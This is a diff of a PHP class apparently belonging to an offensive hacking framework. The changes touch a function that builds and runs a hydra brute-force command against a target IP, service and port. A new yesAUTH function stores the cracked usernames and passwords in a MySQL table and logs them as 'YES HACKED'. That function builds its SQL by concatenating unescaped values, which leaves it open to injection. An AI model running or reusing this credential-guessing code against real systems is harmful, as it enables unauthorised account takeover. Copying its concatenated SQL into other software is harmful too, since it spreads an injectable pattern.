@@ -51,13 +51,11 @@ class AUTH extends PORT{
 	
 	
 	public function port2auth4pass4hydra($service,$username,$userpass){
-	    $result = "";
-	    $result .= $this->ssTitre(__FUNCTION__.": $service://'$username':'$userpass'");
+	    $this->ssTitre(__FUNCTION__.": $service://'$username':'$userpass'");
 	    $service = trim($service);
 	    $username = trim($username);
-	    $query_hydra = "hydra -l \"$username\" -p \"$userpass\" $this->ip $service -f -t 3 -e sr -s $this->port -w 5s -I  -c 5 2>/dev/null  | grep -i 'login:'  ";
-	    $result .= $this->cmd("localhost",$query_hydra);
-	    return  $result.$this->auth2login4hydra($this->req_ret_str($query_hydra));
+	    $query_hydra = "hydra -l \"$username\" -p \"$userpass\" $this->ip $service -f -t 3 -e sr -s $this->port -w 5s 2>/dev/null  | grep -i 'login:'  ";
+	    return  $this->auth2login4hydra($this->req_ret_str($query_hydra));
 	    
 	}
 	
@@ -178,8 +176,24 @@ class AUTH extends PORT{
 	}
 	
 	
+	
+	
+	
+	public function yesAUTH($id8port,$user2name,$user2passe,$user2uid,$user2gid,$user2def,$user2home,$user2shell,$user2info) {
+	    //$id8port = trim($id8port);$user2name = trim($user2name);$user2passe = trim($user2passe);$user2uid = trim($user2uid);$user2gid = trim($user2gid);$user2def = trim($user2def);$user2home = trim($user2home);$user2shell = trim($user2shell);$user2info = trim($user2info);
+	    $chaine = "YES HACKED = $id8port:$user2name:$user2passe:$user2uid:$user2gid:$user2def:$user2home:$user2shell:$user2info";
+	    $sql_r = "SELECT user2name,user2pass FROM AUTH WHERE id8port = $id8port AND user2name= '$user2name' AND user2pass= '$user2passe' ";
+	    //echo "$sql_r\n";
+	    if (!$this->checkBD($sql_r)) {
+	        $sql_w = "INSERT INTO AUTH (id8port,user2name,user2pass,user2uid,user2gid,user2def,user2home,user2shell,user2info) VALUES ($id8port,'$user2name','$user2passe','$user2uid','$user2gid','$user2def','$user2home','$user2shell','$user2info');";
+	        $this->mysql_ressource->query($sql_w);
+	        echo "$sql_w\n";$this->pause();
+	    }
+	    $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","") ;
+	}
+	
+	
 	public function auth2login4hydra($results){
-	    $result = "";
 	    $afficheUSER = array();
 	    if (!empty($results)){
 	        $results_dico  = explode("\n", $results);
@@ -188,8 +202,8 @@ class AUTH extends PORT{
 	            if (preg_match("/login: (?<login>[[:print:]]\w+)([[:space:]]{1,})password: (?<pass>[[:print:]]\w+)$/", $user, $afficheUSER) ) {
 	                //var_dump($afficheUSER);
 	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
-	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'], '','','','','',__FUNCTION__,$this->ip2geoip());
-	                    return $results.$result;
+	                    return $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'], '','','','','',__FUNCTION__);
+
 	                }
 	            }
 	            
@@ -197,22 +211,21 @@ class AUTH extends PORT{
 	            if (preg_match("/password: (?<pass>[[:print:]]\w+)$/", $user, $afficheUSER) ) {
 	                //var_dump($afficheUSER);
 	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
-	                    $result .= $this->yesAUTH($this->port2id,"", $afficheUSER['pass'], '','','','','',__FUNCTION__,$this->ip2geoip());
-	                    return $results.$result;
+	                    return $this->yesAUTH($this->port2id,"", $afficheUSER['pass'], '','','','','',__FUNCTION__);
+
 	                }
 	            }
 	            
 	            if (preg_match("/login: (?<login>[[:print:]]\w+)$/", $user, $afficheUSER) ) {
 	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
-	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], "", '','','','','',__FUNCTION__,$this->ip2geoip());
-	                    return $results.$result;
+	                    return $this->yesAUTH($this->port2id,$afficheUSER['login'], "", '','','','','',__FUNCTION__);
 	                }
 	            }
 	            
 	        }
 	    }
 	    
-	    return $results.$result;
+
 	}
 	
 
@@ -445,7 +458,7 @@ class AUTH extends PORT{
 	    $user2pass = trim($user2pass);
 	    $user2name = trim($user2name);
 	    $this->ssTitre(__FUNCTION__.": finger '$user2name':'$user2pass'@$this->ip -p $this->port ");
-		$this->rouge("finger $user2name@$this->ip ");
+		$this->note("finger $user2name@$this->ip ");
 	}
 	
 
